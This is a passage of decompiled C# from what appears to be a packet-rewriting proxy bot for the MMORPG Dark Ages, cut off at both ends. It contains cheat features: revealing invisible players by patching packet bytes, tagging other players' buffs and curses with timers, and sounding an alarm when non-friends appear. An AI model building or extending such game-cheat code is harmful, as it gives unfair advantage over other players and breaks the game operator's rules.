      else if (client.MapInfo.Number == 10240 && (client.Currentnpctext.StartsWith("You killed my beloved") || client.Currentnpctext.StartsWith("How dare you enter")))
      {
        client.closepopupvars();
        string empty = string.Empty;
      }
      else if (client.Currentnpctext.Contains("one of the gods of the ") || client.Currentnpctext.Contains(" is praying to "))
      {
        if (client.Currentnpctext.Contains("Deoch Trinity") || client.Currentnpctext.Contains(" is praying to Deoch"))
          client.prayscript = Server.Dialogs["Deoch Prayer"];
        else if (client.Currentnpctext.Contains("Glioca Trinity") || client.Currentnpctext.Contains(" is praying to Glioca"))
          client.prayscript = Server.Dialogs["Glioca Prayer"];
        else if (client.Currentnpctext.Contains("Cail Trinity") || client.Currentnpctext.Contains(" is praying to Cail"))
          client.prayscript = Server.Dialogs["Cail Prayer"];
        else if (client.Currentnpctext.Contains("Luathas Trinity") || client.Currentnpctext.Contains(" is praying to Luathas"))
          client.prayscript = Server.Dialogs["Luathas Prayer"];
        else if (client.Currentnpctext.Contains("Gramail Trinity") || client.Currentnpctext.Contains(" is praying to Gramail"))
          client.prayscript = Server.Dialogs["Gramail Prayer"];
        else if (client.Currentnpctext.Contains("Fiosachd Trinity") || client.Currentnpctext.Contains(" is praying to Fiosachd"))
          client.prayscript = Server.Dialogs["Fiosachd Prayer"];
        else if (client.Currentnpctext.Contains("Ceannlaidir Trinity") || client.Currentnpctext.Contains(" is praying to Ceannlaidir"))
          client.prayscript = Server.Dialogs["Ceannlaidir Prayer"];
        else if (client.Currentnpctext.Contains("Sgrios Trinity") || client.Currentnpctext.Contains(" is praying to Sgrios"))
          client.prayscript = Server.Dialogs["Sgrios Prayer"];
      }
      else if (client.Currentnpctext.Contains("Ancusa"))
        client.herbscript = Server.Dialogs["Ancusa"];
      else if (client.Currentnpctext.Contains("Betony"))
        client.herbscript = Server.Dialogs["Betony"];
      else if (client.Currentnpctext.Contains("Fifleaf"))
        client.herbscript = Server.Dialogs["Fifleaf"];
      else if (client.Currentnpctext.Contains("Hemloch"))
        client.herbscript = Server.Dialogs["Hemloch"];
      else if (client.Currentnpctext.Contains("Hydele"))
        client.herbscript = Server.Dialogs["Hydele"];
      else if (client.Currentnpctext.Contains("Personaca"))
        client.herbscript = Server.Dialogs["Personaca"];
      return true;
    }

    public bool ServerMessage_0x31_MailMenu(Client client, ServerPacket msg)
    {
      ushort num1;
      string str1;
      byte num2;
      ushort num3;
      string str2;
      byte num4;
      byte num5;
      string str3;
      byte num6;
      switch (msg.ReadByte())
      {
        case 1:
          ushort num7 = msg.ReadUInt16();
          for (int index = 0; index < (int) num7; ++index)
          {
            num1 = msg.ReadUInt16();
            str1 = msg.ReadString8();
          }
          break;
        case 2:
          num2 = msg.ReadByte();
          num1 = msg.ReadUInt16();
          str1 = msg.ReadString8();
          byte num8 = msg.ReadByte();
          for (int index = 0; index < (int) num8; ++index)
          {
            msg.ReadByte();
            num3 = msg.ReadUInt16();
            str2 = msg.ReadString8();
            num4 = msg.ReadByte();
            num5 = msg.ReadByte();
            str3 = msg.ReadString8();
          }
          break;
        case 3:
          num2 = msg.ReadByte();
          msg.ReadByte();
          num3 = msg.ReadUInt16();
          str2 = msg.ReadString8();
          num4 = msg.ReadByte();
          num5 = msg.ReadByte();
          str3 = msg.ReadString8();
          msg.ReadString16();
          break;
        case 4:
          num2 = msg.ReadByte();
          num1 = msg.ReadUInt16();
          str1 = msg.ReadString8();
          byte num9 = msg.ReadByte();
          ushort num10 = 0;
          for (int index = 0; index < (int) num9; ++index)
          {
            num6 = msg.ReadByte();
            ushort num11 = msg.ReadUInt16();
            string str4 = msg.ReadString8();
            num4 = msg.ReadByte();
            num5 = msg.ReadByte();
            string str5 = msg.ReadString8();
            Mail mail = new Mail();
            mail.Sender = str4;
            mail.Title = str5;
            mail.Number = num11;
            num10 = mail.Number;
            client.MailList.Add(mail);
          }
          break;
        case 5:
          num2 = msg.ReadByte();
          num6 = msg.ReadByte();
          msg.ReadInt16();
          msg.ReadString8();
          num4 = msg.ReadByte();
          num5 = msg.ReadByte();
          msg.ReadString8();
          msg.ReadString16();
          break;
        case 6:
          num2 = msg.ReadByte();
          msg.ReadString8();
          break;
      }
      return true;
    }

    public bool ServerMessage_0x33_DisplayPlayer(Client client, ServerPacket msg)
    {
      Player player = new Player();
      player.Location.X = (int) msg.ReadUInt16();
      player.Location.Y = (int) msg.ReadUInt16();
      player.Location.Direction = (Direction) msg.ReadByte();
      player.ID = msg.ReadUInt32();
      player.Head = msg.ReadUInt16();
      if (player.Head == ushort.MaxValue)
      {
        player.Form = msg.ReadUInt16();
        player.Body = (byte) 0;
        player.Arms = (ushort) msg.ReadByte();
        player.Boots = msg.ReadByte();
        player.Armor = msg.ReadUInt16();
        player.Shield = msg.ReadByte();
        player.Weapon = msg.ReadUInt16();
        msg.Read(1);
        player.HeadColor = (byte) 0;
        player.BootColor = (byte) 0;
        player.Acc1Color = (byte) 0;
        player.Acc1 = (ushort) 0;
        player.Acc2Color = (byte) 0;
        player.Acc2 = (ushort) 0;
        player.Unknown = (byte) 0;
        player.Acc3 = (ushort) 0;
        player.Unknown2 = (byte) 0;
        player.RestCloak = (byte) 0;
        player.Overcoat = (ushort) 0;
        player.OvercoatColor = (byte) 0;
        player.SkinColor = (byte) 0;
        player.HideBool = (byte) 0;
        player.FaceShape = (byte) 0;
      }
      else
      {
        player.Form = (ushort) 0;
        player.Body = msg.ReadByte();
        player.Arms = msg.ReadUInt16();
        player.Boots = msg.ReadByte();
        player.Armor = msg.ReadUInt16();
        player.Shield = msg.ReadByte();
        player.Weapon = msg.ReadUInt16();
        player.HeadColor = msg.ReadByte();
        player.BootColor = msg.ReadByte();
        player.Acc1Color = msg.ReadByte();
        player.Acc1 = msg.ReadUInt16();
        player.Acc2Color = msg.ReadByte();
        player.Acc2 = msg.ReadUInt16();
        player.Unknown = msg.ReadByte();
        player.Acc3 = msg.ReadUInt16();
        player.Unknown2 = msg.ReadByte();
        player.RestCloak = msg.ReadByte();
        player.Overcoat = msg.ReadUInt16();
        player.OvercoatColor = msg.ReadByte();
        player.SkinColor = msg.ReadByte();
        player.HideBool = msg.ReadByte();
        player.FaceShape = msg.ReadByte();
      }
      player.NameTagStyle = msg.ReadByte();
      player.Name = msg.ReadString((int) msg.ReadByte());
      player.GroupName = msg.ReadString((int) msg.ReadByte());
      player.Map = client.MapInfo.Number;
      if (client.Tab.MonstersByPlayer != null && player.Name.ToLower() == client.Tab.MonstersByPlayer.Text.Remove(client.Tab.MonstersByPlayer.Text.IndexOf("'s")).ToLower())
        client.playeridformonster = player.ID;
      if (!Server.StaticCharacters.ContainsKey(player.ID))
        Server.StaticCharacters.Add(player.ID, (Character) player);
      if (!client.Characters.ContainsKey(player.ID))
      {
        if (player.Name != string.Empty && client.FindCharacterByName<Player>(player.Name) != null)
          client.RemoveCharacterByName(player.Name);
        client.Characters.Add(player.ID, (Character) player);
        client.Characters[player.ID].CreateTime = DateTime.UtcNow;
        if (player.Name == string.Empty)
        {
          foreach (Client client1 in Server.Alts.Values.ToArray<Client>())
          {
            if (client1 != null && (int) client1.PlayerID == (int) player.ID)
              client.Characters[player.ID].Name = client1.Name;
          }
          if (client.Characters[player.ID].Name == string.Empty && (int) client.ClickEntityID != (int) player.ID)
          {
            client.hidelegend = true;
            client.ClickEntityID = player.ID;
            client.ClickEntity(player.ID);
          }
        }
        if (client.Characters[player.ID].Name != string.Empty)
          (client.Characters[player.ID] as Player).DisplayName = client.Characters[player.ID].Name;
      }
      else
      {
        if (player.Name != string.Empty)
          client.Characters[player.ID].Name = player.Name;
        Player character = client.Characters[player.ID] as Player;
        character.Map = player.Map;
        character.Location.X = player.Location.X;
        character.Location.Y = player.Location.Y;
        character.Location.Direction = player.Location.Direction;
        character.Head = player.Head;
        character.Form = player.Form;
        character.Body = player.Body;
        character.Arms = player.Arms;
        character.Boots = player.Boots;
        character.Armor = player.Armor;
        character.Shield = player.Shield;
        character.Weapon = player.Weapon;
        character.HeadColor = player.HeadColor;
        character.BootColor = player.BootColor;
        character.Acc1Color = player.Acc1Color;
        character.Acc1 = player.Acc1;
        character.Acc2Color = player.Acc2Color;
        character.Acc2 = player.Acc2;
        character.Unknown = player.Unknown;
        character.Acc3 = player.Acc3;
        character.Unknown2 = player.Unknown2;
        character.RestCloak = player.RestCloak;
        character.Overcoat = player.Overcoat;
        character.OvercoatColor = player.OvercoatColor;
        character.SkinColor = player.SkinColor;
        character.HideBool = player.HideBool;
        character.FaceShape = player.FaceShape;
        character.NameTagStyle = player.NameTagStyle;
        character.GroupName = player.GroupName;
        character.IsOnScreen = true;
      }
      if (!client.AlarmMapAllowList && Server.alertfornonfriends && !client.SafeToWalkFast && (client.Characters.ContainsKey(player.ID) && client.Characters[player.ID].Name != string.Empty && (!Server.Alts.ContainsKey(client.Characters[player.ID].Name.ToLower()) && !Server.friendlist.Contains(client.Characters[player.ID].Name.ToLower())) || client.Characters[player.ID].Name == string.Empty) && (client.MapInfo.Number == 623 ? (client.ServerLocation.Y > 65 || client.ServerLocation.X > 20 ? 1 : (client.ServerLocation.Y < 27 ? 1 : 0)) : 1) != 0)
      {
        if (client.Characters[player.ID].Name != string.Empty)
          client.SendMessage(client.Characters[player.ID].Name + " was seen!", "red", false);
        else
          client.Characters[player.ID].wasseenwarning = true;
        if (Program.MainForm.vplaynoise && !Server.SentryAlarm)
        {
          User32.FlashWindow(client.mainProc.MainWindowHandle, false);
          Server.SentryAlarm = true;
          Server.alarm = new SoundPlayer(Assembly.GetExecutingAssembly().GetManifestResourceStream("ProxyBase.ALARMquiet.wav"));
          Server.alarmTimer = DateTime.UtcNow;
          Server.alarm.PlayLooping();
        }
        Server.alertfornonfriends = false;
        Server.AlertNonFriendTimer.Start();
      }
      if ((int) player.ID == (int) client.PlayerID)
      {
        client.UpdateFakeNpcs();
        client.SendMessage(client.LastPermMessage, (byte) 18, false);
        client.ClientLocation.X = player.Location.X;
        client.ClientLocation.Y = player.Location.Y;
        client.ClientLocation.Direction = player.Location.Direction;
        client.ServerLocation.Direction = player.Location.Direction;
        client.ClientHead = player.Head;
        client.ClientForm = player.Form;
        client.ClientBody = player.Body;
        client.ClientArms = player.Arms;
        client.ClientBoots = player.Boots;
        client.ClientArmor = player.Armor;
        client.ClientShield = player.Shield;
        client.ClientWeapon = player.Weapon;
        client.ClientHeadColor = player.HeadColor;
        client.ClientBootColor = player.BootColor;
        client.ClientAcc1Color = player.Acc1Color;
        client.ClientAcc1 = player.Acc1;
        client.ClientAcc2Color = player.Acc2Color;
        client.ClientAcc2 = player.Acc2;
        client.ClientUnknown = player.Unknown;
        client.ClientAcc3 = player.Acc3;
        client.ClientUnknown2 = player.Unknown2;
        client.ClientRestCloak = player.RestCloak;
        client.ClientOvercoat = player.Overcoat;
        client.ClientOvercoatColor = player.OvercoatColor;
        client.ClientSkinColor = player.SkinColor;
        client.ClientHideBool = player.HideBool;
        client.ClientFaceShape = player.FaceShape;
        client.ClientNameTagStyle = player.NameTagStyle;
        client.ClientName = player.Name;
        client.ClientGroup = player.GroupName;
        if (!client.safemode)
        {
          if (client.Tab.vusemonster && client.SafeToWalkFast)
          {
            client.imonster = true;
            msg = new ServerPacket((byte) 51);
            msg.WriteUInt16((ushort) player.Location.X);
            msg.WriteUInt16((ushort) player.Location.Y);
            msg.WriteByte((byte) player.Location.Direction);
            msg.WriteUInt32(player.ID);
            msg.WriteUInt16(ushort.MaxValue);
            msg.WriteUInt16((ushort) (client.Tab.usemonsterid.Value + new Decimal(16384)));
            msg.WriteUInt32(0U);
            msg.WriteUInt32(0U);
            msg.WriteByte(player.NameTagStyle);
            msg.WriteString8(client.Name);
            msg.WriteString8(player.GroupName);
          }
          else
          {
            client.imonster = false;
            msg = new ServerPacket((byte) 51);
            msg.WriteUInt16((ushort) player.Location.X);
            msg.WriteUInt16((ushort) player.Location.Y);
            msg.WriteByte((byte) player.Location.Direction);
            msg.WriteUInt32(player.ID);
            if (client.ClientHead == ushort.MaxValue)
            {
              msg.WriteUInt16(client.ClientHead);
              msg.WriteUInt16(client.ClientForm);
              msg.WriteUInt32(0U);
              msg.WriteUInt32(0U);
            }
            else
            {
              if (client.Tab.duhat.Checked && client.Tab.duhatnum.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duhatnum.Value);
              else
                msg.WriteUInt16(client.ClientHead);
              msg.WriteByte(client.ClientBody);
              msg.WriteUInt16(client.ClientArms);
              if (client.Tab.duboots.Checked && client.Tab.dubootsnum.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.dubootsnum.Value);
              else
                msg.WriteByte(client.ClientBoots);
              if (client.Tab.duarmor.Checked && client.Tab.duarmornum.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duarmornum.Value);
              else
                msg.WriteUInt16(client.ClientArmor);
              if (client.Tab.dushield.Checked && client.Tab.dushieldnum.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.dushieldnum.Value);
              else
                msg.WriteByte(client.ClientShield);
              if (client.Tab.duweapon.Checked && client.Tab.duweaponnum.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duweaponnum.Value);
              else
                msg.WriteUInt16(client.ClientWeapon);
              if (client.Tab.duhat.Checked && client.Tab.duhatcolor.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duhatcolor.Value);
              else
                msg.WriteByte(client.ClientHeadColor);
              if (client.Tab.duboots.Checked && client.Tab.dubootcolor.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.dubootcolor.Value);
              else
                msg.WriteByte(client.ClientBootColor);
              if (client.Tab.duacc1.Checked && client.Tab.duacc1color.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duacc1color.Value);
              else
                msg.WriteByte(client.ClientAcc1Color);
              if (client.Tab.duacc1.Checked && client.Tab.duacc1num.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duacc1num.Value);
              else
                msg.WriteUInt16(client.ClientAcc1);
              if (client.Tab.duacc2.Checked && client.Tab.duacc2color.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duacc2color.Value);
              else
                msg.WriteByte(client.ClientAcc2Color);
              if (client.Tab.duacc2.Checked && client.Tab.duacc2num.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duacc2num.Value);
              else
                msg.WriteUInt16(client.ClientAcc2);
              if (client.Tab.duacc3.Checked && client.Tab.duacc3color.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duacc3color.Value);
              else
                msg.WriteByte(client.ClientUnknown);
              if (client.Tab.duacc3.Checked && client.Tab.duacc3num.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duacc3num.Value);
              else
                msg.WriteUInt16(client.ClientAcc3);
              if (client.Tab.duarmor.Checked && client.Tab.duunknown2.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duunknown2.Value);
              else
                msg.WriteByte(client.ClientUnknown2);
              msg.WriteByte(client.ClientRestCloak);
              if (client.Tab.duovercoat.Checked && client.Tab.duovercoatnum.Value != new Decimal(0))
                msg.WriteUInt16((ushort) client.Tab.duovercoatnum.Value);
              else
                msg.WriteUInt16(client.ClientOvercoat);
              if (client.Tab.duovercoat.Checked && client.Tab.duovercoatcolor.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duovercoatcolor.Value);
              else
                msg.WriteByte(client.ClientOvercoatColor);
              if (client.Tab.duskin.Checked && client.Tab.duskinnum.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.duskinnum.Value);
              else
                msg.WriteByte(client.ClientSkinColor);
              msg.WriteByte(client.ClientHideBool);
              if (client.Tab.duface.Checked && client.Tab.dufacenum.Value != new Decimal(0))
                msg.WriteByte((byte) client.Tab.dufacenum.Value);
              else
                msg.WriteByte(client.ClientFaceShape);
            }
            msg.WriteByte(client.ClientNameTagStyle);
            msg.WriteString8(client.ClientName);
            msg.WriteString8(client.ClientGroup);
          }
        }
      }
      if (client.imonster && !client.SafeToWalkFast && !client.safemode)
      {
        client.imonster = false;
        ServerPacket msg1 = new ServerPacket((byte) 51);
        msg1.WriteUInt16((ushort) client.ServerLocation.X);
        msg1.WriteUInt16((ushort) client.ServerLocation.Y);
        msg1.WriteByte((byte) client.ClientLocation.Direction);
        msg1.WriteUInt32(client.PlayerID);
        if (client.ClientHead == ushort.MaxValue)
        {
          msg1.WriteUInt16(client.ClientHead);
          msg1.WriteUInt16(client.ClientForm);
          msg1.WriteUInt32(0U);
          msg1.WriteUInt32(0U);
        }
        else
        {
          msg1.WriteUInt16(client.ClientHead);
          msg1.WriteByte(client.ClientBody);
          msg1.WriteUInt16(client.ClientArms);
          msg1.WriteByte(client.ClientBoots);
          msg1.WriteUInt16(client.ClientArmor);
          msg1.WriteByte(client.ClientShield);
          msg1.WriteUInt16(client.ClientWeapon);
          msg1.WriteByte(client.ClientHeadColor);
          msg1.WriteByte(client.ClientBootColor);
          msg1.WriteByte(client.ClientAcc1Color);
          msg1.WriteUInt16(client.ClientAcc1);
          msg1.WriteByte(client.ClientAcc2Color);
          msg1.WriteUInt16(client.ClientAcc2);
          msg1.WriteByte(client.ClientUnknown);
          msg1.WriteUInt16(client.ClientAcc3);
          msg1.WriteByte(client.ClientUnknown2);
          msg1.WriteByte(client.ClientRestCloak);
          msg1.WriteUInt16(client.ClientOvercoat);
          msg1.WriteByte(client.ClientOvercoatColor);
          msg1.WriteByte(client.ClientSkinColor);
          msg1.WriteByte(client.ClientHideBool);
          msg1.WriteByte(client.ClientFaceShape);
        }
        msg1.WriteByte(client.ClientNameTagStyle);
        msg1.WriteString8(client.ClientName);
        msg1.WriteString8(client.ClientGroup);
        msg1.Write(new byte[3]);
        client.Enqueue(msg1);
      }
      if (!client.Characters.ContainsKey(player.ID))
        return true;
      byte num = (client.Characters[player.ID] as Player).NameTagStyle;
      string str = (client.Characters[player.ID] as Player).Name;
      if (str.Contains("["))
        str = str.Remove(str.IndexOf("[") - 1);
      if (str.Contains(")"))
        str = str.Remove(0, str.IndexOf(" ") + 1);
      if (!client.safemode)
      {
        DateTime utcNow;
        if (client.Tab.vmonitordion && Server.StaticCharacters[player.ID].hasdion)
        {
          num = (byte) 3;
          utcNow = DateTime.UtcNow;
          str = "(" + (20 - (int) utcNow.Subtract(Server.StaticCharacters[player.ID].SpellAnimationHistory[244]).TotalSeconds).ToString() + ") " + str;
        }
        if (client.Tab.vmonitordion && Server.StaticCharacters[player.ID].hasironskin)
        {
          num = (byte) 3;
          utcNow = DateTime.UtcNow;
          str = "(" + (19 - (int) utcNow.Subtract(Server.StaticCharacters[player.ID].SpellAnimationHistory[89]).TotalSeconds).ToString() + ") " + str;
        }
        if (client.Tab.vmonitordion && Server.StaticCharacters[player.ID].hasdioncomlha)
        {
          num = (byte) 3;
          utcNow = DateTime.UtcNow;
          str = "(" + (20 - (int) utcNow.Subtract(Server.StaticCharacters[player.ID].SpellAnimationHistory[93]).TotalSeconds).ToString() + ") " + str;
        }
        if (client.Tab.vmonitordion && Server.StaticCharacters[player.ID].hasasgall)
        {
          num = (byte) 3;
          utcNow = DateTime.UtcNow;
          str = "(" + (13 - (int) utcNow.Subtract(Server.StaticCharacters[player.ID].SpellAnimationHistory[66]).TotalSeconds).ToString() + ") " + str;
        }
        if (client.Tab.vmonitorspells && Server.StaticCharacters[player.ID].hasaite && !Server.StaticCharacters[player.ID].hasfas)
        {
          num = (byte) 3;
          str += " [aite]";
        }
        else if (client.Tab.vmonitorspells && Server.StaticCharacters[player.ID].hasaite && Server.StaticCharacters[player.ID].hasfas)
        {
          num = (byte) 3;
          str += " [aite/fas]";
        }
        else if (client.Tab.vmonitorspells && !Server.StaticCharacters[player.ID].hasaite && Server.StaticCharacters[player.ID].hasfas)
        {
          num = (byte) 3;
          str += " [fas]";
        }
      }
      if (!client.safemode && client.Tab.seeinvis.Checked)
        (client.Characters[player.ID] as Player).DisplayName = str;
      ServerPacket msg2 = new ServerPacket((byte) 51);
      msg2.WriteUInt16((ushort) client.Characters[player.ID].Location.X);
      msg2.WriteUInt16((ushort) client.Characters[player.ID].Location.Y);
      msg2.WriteByte((byte) client.Characters[player.ID].Location.Direction);
      msg2.WriteUInt32(client.Characters[player.ID].ID);
      msg2.WriteUInt16((client.Characters[player.ID] as Player).Head);
      if ((client.Characters[player.ID] as Player).Head == ushort.MaxValue)
      {
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Form);
        msg2.WriteUInt32(0U);
        msg2.WriteUInt32(0U);
        if (!client.safemode)
          msg2.WriteByte((byte) 3);
        else
          msg2.WriteByte(num);
      }
      else
      {
        msg2.WriteByte((client.Characters[player.ID] as Player).Body);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Arms);
        msg2.WriteByte((client.Characters[player.ID] as Player).Boots);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Armor);
        msg2.WriteByte((client.Characters[player.ID] as Player).Shield);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Weapon);
        msg2.WriteByte((client.Characters[player.ID] as Player).HeadColor);
        msg2.WriteByte((client.Characters[player.ID] as Player).BootColor);
        msg2.WriteByte((client.Characters[player.ID] as Player).Acc1Color);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Acc1);
        msg2.WriteByte((client.Characters[player.ID] as Player).Acc2Color);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Acc2);
        msg2.WriteByte((client.Characters[player.ID] as Player).Unknown);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Acc3);
        msg2.WriteByte((client.Characters[player.ID] as Player).Unknown2);
        msg2.WriteByte((client.Characters[player.ID] as Player).RestCloak);
        msg2.WriteUInt16((client.Characters[player.ID] as Player).Overcoat);
        msg2.WriteByte((client.Characters[player.ID] as Player).OvercoatColor);
        msg2.WriteByte((client.Characters[player.ID] as Player).SkinColor);
        msg2.WriteByte((client.Characters[player.ID] as Player).HideBool);
        msg2.WriteByte((client.Characters[player.ID] as Player).FaceShape);
        if (!client.safemode && msg2.BodyData[11] == (byte) 0 && client.Tab.seeinvis.Checked)
        {
          msg2.BodyData[11] = Server.invis;
          msg2.WriteByte((byte) 3);
        }
        else
          msg2.WriteByte(num);
      }
      msg2.WriteString8(str);
      msg2.WriteString8((client.Characters[player.ID] as Player).GroupName);
      client.Characters[player.ID].NameIsRed = false;
      Server.StaticCharacters[player.ID].NameIsRed = false;
      if (!client.safemode)
      {
        if (client.Tab.monitords.Checked && player.Head != ushort.MaxValue && Server.StaticCharacters.ContainsKey(player.ID) && (Server.StaticCharacters[player.ID].hasdarkerseal || Server.StaticCharacters[player.ID].hasdarkseal))
        {
          client.Characters[player.ID].NameIsRed = true;
          Server.StaticCharacters[player.ID].NameIsRed = true;
          msg2.BodyData[39] = (byte) 1;
        }
        else if (client.Tab.monitords.Checked && player.Head == ushort.MaxValue && Server.StaticCharacters.ContainsKey(player.ID) && (Server.StaticCharacters[player.ID].hasdarkerseal || Server.StaticCharacters[player.ID].hasdarkseal))
        {
          client.Characters[player.ID].NameIsRed = true;
          Server.StaticCharacters[player.ID].NameIsRed = true;
          msg2.BodyData[21] = (byte) 1;
        }
        else if (client.Tab.vmonitorcurses && player.Head != ushort.MaxValue && Server.StaticCharacters.ContainsKey(player.ID) && Server.StaticCharacters[player.ID].hasardcradh)
        {
          client.Characters[player.ID].NameIsRed = true;
          Server.StaticCharacters[player.ID].NameIsRed = true;
          msg2.BodyData[39] = (byte) 1;
        }
        else if (client.Tab.vmonitorcurses && player.Head == ushort.MaxValue && Server.StaticCharacters.ContainsKey(player.ID) && Server.StaticCharacters[player.ID].hasardcradh)
        {
          client.Characters[player.ID].NameIsRed = true;
          Server.StaticCharacters[player.ID].NameIsRed = true;
          msg2.BodyData[21] = (byte) 1;
        }
      }
      msg2.Write(new byte[3]);
      client.Enqueue(msg2);
      if ((int) player.ID == (int) client.PlayerID)
      {
        msg.Write(new byte[3]);
        client.Enqueue(msg);
      }
      return false;
    }

    public bool ServerMessage_0x34_Legend(Client client, ServerPacket msg)
    {
      string str1 = string.Empty;
      uint key = msg.ReadUInt32();
      msg.Read(55);
      string str2 = msg.ReadString((int) msg.ReadByte());
      msg.ReadByte();
      msg.ReadString((int) msg.ReadByte());
      msg.ReadByte();
      msg.ReadString((int) msg.ReadByte());
      msg.ReadString((int) msg.ReadByte());
      msg.ReadString((int) msg.ReadByte());
      byte num = msg.ReadByte();
      for (int index = 0; index < (int) num; ++index)
      {
        msg.ReadByte();
        msg.ReadByte();
        msg.ReadString((int) msg.ReadByte());
        string str3 = msg.ReadString((int) msg.ReadByte());
        if (str3.StartsWith("Mentored by "))
        {
          string str4 = str3.Remove(str3.IndexOf(" - "));
          str1 = str4.Remove(str4.IndexOf("M"), 12);
        }
      }
      if (str1 != string.Empty)
      {
        if (str1.ToLower() == client.Name.ToLower())
        {
          client.rementor = true;
        }
        else
        {
          client.hasamentor = true;
          client.Hasmentortimer = DateTime.UtcNow;
        }
      }
      else
        client.mentoraccept = true;
      if (client.Characters.ContainsKey(key) && client.Characters[key] != null && client.Characters[key] is Player && (client.Characters[key] as Player).Name == string.Empty)
      {
        client.Characters[key].Name = str2;
        if (Server.StaticCharacters.ContainsKey(key))
          Server.StaticCharacters[key].Name = str2;
        if (client.Characters[key].wasseenwarning && !Server.Alts.ContainsKey(client.Characters[key].Name.ToLower()))
        {
          client.SendMessage(client.Characters[key].Name + " was seen!", "red", false);
          client.Characters[key].wasseenwarning = false;
        }
        if (!client.safemode && client.Tab.seeinvis.Checked)
        {
          msg = new ServerPacket((byte) 51);
          msg.WriteUInt16((ushort) client.Characters[key].Location.X);
          msg.WriteUInt16((ushort) client.Characters[key].Location.Y);
          msg.WriteByte((byte) client.Characters[key].Location.Direction);
          msg.WriteUInt32(client.Characters[key].ID);
          msg.WriteUInt16((client.Characters[key] as Player).Head);
          if ((client.Characters[key] as Player).Head == ushort.MaxValue)
          {
            msg.WriteUInt16((client.Characters[key] as Player).Form);
            msg.WriteUInt32(0U);
            msg.WriteUInt32(0U);
          }
          else
          {
            msg.WriteByte((client.Characters[key] as Player).Body);
            msg.WriteUInt16((client.Characters[key] as Player).Arms);
            msg.WriteByte((client.Characters[key] as Player).Boots);
            msg.WriteUInt16((client.Characters[key] as Player).Armor);
            msg.WriteByte((client.Characters[key] as Player).Shield);
            msg.WriteUInt16((client.Characters[key] as Player).Weapon);
            msg.WriteByte((client.Characters[key] as Player).HeadColor);
            msg.WriteByte((client.Characters[key] as Player).BootColor);
            msg.WriteByte((client.Characters[key] as Player).Acc1Color);
            msg.WriteUInt16((client.Characters[key] as Player).Acc1);
            msg.WriteByte((client.Characters[key] as Player).Acc2Color);
            msg.WriteUInt16((client.Characters[key] as Player).Acc2);
            msg.WriteByte((client.Characters[key] as Player).Unknown);
            msg.WriteUInt16((client.Characters[key] as Player).Acc3);
            msg.WriteByte((client.Characters[key] as Player).Unknown2);
            msg.WriteByte((client.Characters[key] as Player).RestCloak);
            msg.WriteUInt16((client.Characters[key] as Player).Overcoat);
            msg.WriteByte((client.Characters[key] as Player).OvercoatColor);
            msg.WriteByte((client.Characters[key] as Player).SkinColor);
            msg.WriteByte((client.Characters[key] as Player).HideBool);
            msg.WriteByte((client.Characters[key] as Player).FaceShape);
            if (msg.BodyData[11] == (byte) 0)
              msg.BodyData[11] = Server.invis;
          }
          client.Characters[key].NameIsRed = false;
          Server.StaticCharacters[key].NameIsRed = false;
          if (client.Tab.vmonitorcurses && Server.StaticCharacters.ContainsKey(key) && Server.StaticCharacters[key] != null && (Server.StaticCharacters[key].hasardcradh || Server.StaticCharacters[key].hasdarkerseal || Server.StaticCharacters[key].hasdarkseal))
          {
            client.Characters[key].NameIsRed = true;
            Server.StaticCharacters[key].NameIsRed = true;
            msg.WriteByte((byte) 1);
          }
          else
            msg.WriteByte((byte) 3);
          msg.WriteString8((client.Characters[key] as Player).Name);
          msg.WriteString8((client.Characters[key] as Player).GroupName);
          msg.Write(new byte[3]);
          client.Enqueue(msg);
        }
        client.hidelegend = false;
        return false;
      }
      if (client.hidelegend)
      {
        client.hidelegend = false;
        return false;
      }
      return !client.disablelegend;
    }

    public bool ServerMessage_0x36_CountryList(Client client, ServerPacket msg)
    {
      client.CountryList.Clear();
      msg.ReadUInt16();
      ushort num1 = msg.ReadUInt16();
      for (int index = 0; index < (int) num1; ++index)
      {
        byte num2 = msg.ReadByte();
        msg.ReadByte();
        msg.ReadByte();
        msg.ReadString((int) msg.ReadByte());
        msg.ReadByte();
        string str = msg.ReadString((int) msg.ReadByte());
        if (!client.CountryList.Contains(str.ToLower()))
          client.CountryList.Add(str.ToLower());
        byte num3 = (byte) ((uint) num2 & 7U);
        bool flag = ((int) num2 & 8) >> 3 == 1;
        byte num4 = (byte) (((int) num2 & 240) >> 4);
      }
      if (!client.manualopencountrylist)
        return true;
      client.manualopencountrylist = false;
      return false;
    }

    public bool ServerMessage_0x37_AddAppendage(Client client, ServerPacket msg)
    {
      byte num1 = msg.ReadByte();
      msg.ReadUInt16();
      msg.ReadByte();
      string str = msg.ReadString((int) msg.ReadByte());
      int num2 = (int) msg.ReadByte();
      uint num3 = msg.ReadUInt32();
      uint num4 = msg.ReadUInt32();
      if (num3 > 0U && ((num4 < 800U && num3 > 1000U || (double) num4 / (double) num3 * 100.0 < 80.0) && !client.HasLowDuraDN()))
        client.needsrepaired = true;
      switch (num1)
      {
        case 1:
          client.staffnow = str;
          break;
        case 2:
          client.manualremovedarmor = false;
          client.removedarmordelay = DateTime.MinValue;
          client.removedarmor = string.Empty;
          client.armornow = str;
          break;
        case 3:
          client.ShieldOn = true;
          break;
        case 6:
          client.Necklace = str;
          break;
        case 15:
          client.Overcoat = str;
          break;
        case 16:
